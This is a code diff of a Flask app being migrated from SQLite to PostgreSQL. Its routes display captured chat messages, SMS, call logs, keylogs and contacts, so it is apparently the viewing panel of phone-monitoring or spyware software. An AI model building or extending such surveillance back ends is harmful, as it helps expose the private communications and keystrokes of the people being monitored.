@@ -53,13 +53,15 @@ def chat(name):
         return "Database connection error", 500
     
     try:
-        messages = conn.execute(
-            'SELECT * FROM ChatMessages WHERE sender = ? ORDER BY time DESC LIMIT 50',
-            (name,)
-        ).fetchall()
+        with conn.cursor() as cur:
+            cur.execute(
+                'SELECT * FROM chat_messages WHERE sender = %s ORDER BY time DESC LIMIT 50',
+                (name,)
+            )
+            messages = cur.fetchall()
         conn.close()
         return render_template('chat.html', name=name, messages=messages)
-    except sqlite3.Error as e:
+    except Exception as e:
         logger.error(f"Database error: {e}")
         return "Error fetching messages", 500
 
@@ -71,13 +73,15 @@ def sms_thread(name):
         return "Database connection error", 500
     
     try:
-        messages = conn.execute(
-            'SELECT * FROM SMS WHERE from_to = ? ORDER BY time DESC LIMIT 50',
-            (name,)
-        ).fetchall()
+        with conn.cursor() as cur:
+            cur.execute(
+                'SELECT * FROM sms WHERE from_to = %s ORDER BY time DESC LIMIT 50',
+                (name,)
+            )
+            messages = cur.fetchall()
         conn.close()
         return render_template('sms.html', name=name, sms_messages=messages)
-    except sqlite3.Error as e:
+    except Exception as e:
         logger.error(f"Database error: {e}")
         return "Error fetching messages", 500
 
@@ -89,12 +93,12 @@ def calls():
         return "Database connection error", 500
     
     try:
-        call_logs = conn.execute(
-            'SELECT * FROM Calls ORDER BY time DESC LIMIT 50'
-        ).fetchall()
+        with conn.cursor() as cur:
+            cur.execute('SELECT * FROM calls ORDER BY time DESC LIMIT 50')
+            call_logs = cur.fetchall()
         conn.close()
         return render_template('calls.html', call_logs=call_logs)
-    except sqlite3.Error as e:
+    except Exception as e:
         logger.error(f"Database error: {e}")
         return "Error fetching call logs", 500
 
@@ -106,12 +110,12 @@ def keylogs():
         return "Database connection error", 500
     
     try:
-        keylog_data = conn.execute(
-            'SELECT * FROM Keylogs ORDER BY time DESC LIMIT 50'
-        ).fetchall()
+        with conn.cursor() as cur:
+            cur.execute('SELECT * FROM keylogs ORDER BY time DESC LIMIT 50')
+            keylog_data = cur.fetchall()
         conn.close()
         return render_template('keylogs.html', keylogs=keylog_data)
-    except sqlite3.Error as e:
+    except Exception as e:
         logger.error(f"Database error: {e}")
         return "Error fetching keylogs", 500
 
@@ -123,12 +127,12 @@ def contacts_list():
         return "Database connection error", 500
     
     try:
-        contact_data = conn.execute(
-            'SELECT * FROM Contacts ORDER BY name'
-        ).fetchall()
+        with conn.cursor() as cur:
+            cur.execute('SELECT * FROM contacts ORDER BY name')
+            contact_data = cur.fetchall()
         conn.close()
         return render_template('contacts.html', contacts=contact_data)
-    except sqlite3.Error as e:
+    except Exception as e:
         logger.error(f"Database error: {e}")
         return "Error fetching contacts", 500
 
@@ -144,24 +148,27 @@ def search():
         return jsonify({'error': 'Database connection error'}), 500
 
     try:
-        chat_results = conn.execute('''
-            SELECT 'chat' as type, sender as name, text, time 
-            FROM ChatMessages 
-            WHERE text LIKE ? 
-            ORDER BY time DESC LIMIT 25
-        ''', ('%' + search_term + '%',)).fetchall()
+        with conn.cursor() as cur:
+            cur.execute('''
+                SELECT 'chat' as type, sender as name, text, time 
+                FROM chat_messages 
+                WHERE text LIKE %s 
+                ORDER BY time DESC LIMIT 25
+            ''', ('%' + search_term + '%',))
+            chat_results = cur.fetchall()
 
-        sms_results = conn.execute('''
-            SELECT 'sms' as type, from_to as name, text, time 
-            FROM SMS 
-            WHERE text LIKE ? 
-            ORDER BY time DESC LIMIT 25
-        ''', ('%' + search_term + '%',)).fetchall()
+            cur.execute('''
+                SELECT 'sms' as type, from_to as name, text, time 
+                FROM sms 
+                WHERE text LIKE %s 
+                ORDER BY time DESC LIMIT 25
+            ''', ('%' + search_term + '%',))
+            sms_results = cur.fetchall()
 
-        results = [dict(row) for row in chat_results + sms_results]
+        results = chat_results + sms_results
         conn.close()
         return jsonify(results)
-    except sqlite3.Error as e:
+    except Exception as e:
         logger.error(f"Search error: {e}")
         return jsonify({'error': 'Search failed'}), 500
 
